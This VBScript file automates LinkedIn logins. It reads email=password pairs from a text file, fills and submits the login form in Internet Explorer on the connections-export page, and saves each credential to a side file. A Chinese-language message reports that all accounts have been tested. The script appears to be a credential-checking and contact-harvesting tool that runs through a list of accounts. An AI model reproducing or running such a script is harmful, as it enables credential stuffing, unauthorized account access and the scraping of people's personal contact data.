Const BTN=0
Const EDT=1
Const SEL=2
Dim WS
Set WS = WScript.CreateObject("Wscript.Shell")
Dim fso,PassWordFile,Line,UserName,PassWord,User,VarFile
Set fso = WScript.CreateObject("Scripting.Filesystemobject")
Set PassWordFile=fso.OpenTextFile("PassWord.txt",1,False)
Do 
	If Not PassWordFile.AtEndOfStream Then 
		Line=Trim(PassWordFile.ReadLine)
	Else 
		MsgBox "所有帐号测试完成！"&vbCrLf&"脚本将退出"
		WScript.Quit
	End If
	If Line<>"" Then 
		UserName=FindString(Line,"[A-Za-z0-9_\x22]+([-+.][A-Za-z0-9_\x22]+)*@((\w+([-.]\w+)*\.\w+([-.]\w+)*)|(\x5B\d+\.\d+\.\d+\.\d+\x5D))")
		PassWord=FindString(Line,"[\x20-\x3c\x3e-\x7b\x7d-\x7e]+(?==)")
		User=FindString(UserName,"[A-Za-z0-9_\x22]+([-+.][A-Za-z0-9_\x22]+)*(?=@)")
	Else
		MsgBox "Line为空!"
		WScript.Quit
	End If 
Loop Until UserName<>"" And PassWord<>""
PassWordFile.Close


If UserName<>"" And PassWord<>"" Then
	Dim IE
	Set IE=CreateObject("Internetexplorer.Application") 
	'IE.Navigate "https://www.linkedin.com/uas/login?goback=.nmp_*1_*1_*1_*1_*1_*1_*1_*1_*1_*1&trk=hb_signin"
	IE.Navigate "http://www.linkedin.com/people/export-settings"
	IE.Width=1200
	IE.Height = 800
	IE.Left = 0
	IE.Top = 0
	AutoComplete IE,"session_key-login",EDT,UserName
	AutoComplete IE,"session_password-login",EDT,PassWord
	AutoComplete IE,"btn-primary",BTN,"1"
	
	'WaitForReady IE,"Your connections were successfully exported"
End If
Set VarFile=fso.OpenTextFile("var.txt",2,True)
VarFile.Write UserName & vbCrLf & PassWord & vbCrLf & User
VarFile.Close
WaitForReady IE,"You have signed out"
ExitMe


Function AutoComplete(IE,sFieldID,nType,sValue)
	IE.Visible=True 
	While IE.Busy Or IE.ReadyState<>4
		WScript.Sleep 50
	Wend
	IE.Document.GetElementById(sFieldID).Focus
	Select Case nType
	Case BTN
		IE.Document.GetElementById(sFieldID).Click
	Case EDT
		IE.Document.GetElementById(sFieldID).Value=sValue
	Case SEL
		IE.Document.GetElementById(sFieldID).Value=sValue
	Case Else
		MsgBox "Error!"
	End Select
End Function

'-----------------------------------------------------------------------------
'将sSource用sPartn匹配，返回匹配出的值，每个一行
Function FindString(sSource,sPartn)
	Dim RegEx,Match,Matches,ret
	Set RegEx=New RegExp
	RegEx.Pattern = sPartn
	RegEx.IgnoreCase=1
	RegEx.Global=1
	Set Matches=RegEx.Execute(sSource)
	For Each Match In Matches 
		ret = ret + Match.Value
	Next
	FindString = ret
End Function

Function WaitForReady(IE,text)
	On Error Resume Next  
	Do Until InStr(IE.Document.Body.OuterHtml,text)
		WScript.Sleep 100
		If IE.HWND=Null Then 
			ExitMe
			WScript.Quit
		End If 
	Loop
End Function


Function ExitMe()
	Set PassWordFile=fso.OpenTextFile("PassWord.txt",1,False)
	If Not PassWordFile.AtEndOfStream Then Line=PassWordFile.ReadLine
	If Not PassWordFile.AtEndOfStream Then 
		Line=PassWordFile.ReadAll
	Else
		Line=""
	End If 
	PassWordFile.Close
	Set PassWordFile=fso.OpenTextFile("PassWord.txt",2,False)
	PassWordFile.Write Line
	PassWordFile.Close
	WS.Run "MoveFile.vbs"
	IE.Quit
	WScript.Quit
End Function 